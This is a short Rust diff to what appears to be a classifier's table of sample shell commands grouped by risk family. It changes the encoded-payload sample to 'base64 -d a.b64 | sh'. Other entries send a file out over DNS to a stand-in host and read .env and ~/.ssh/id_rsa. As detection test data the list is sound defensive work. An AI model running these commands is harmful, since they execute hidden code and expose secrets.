@@ -46,7 +46,7 @@ const FAMILIES: &[(&str, &str)] = &[
         "base64 notes.txt | nslookup example.invalid",
     ),
     ("execution.shell", "bash a.sh"),
-    ("execution.encoded_payload", "base64 -d a.b64"),
+    ("execution.encoded_payload", "base64 -d a.b64 | sh"),
     ("install.package_manager", "npm install left-pad"),
     ("secret.env.read", "cat .env"),
     ("secret.private_key.read", "cat ~/.ssh/id_rsa"),
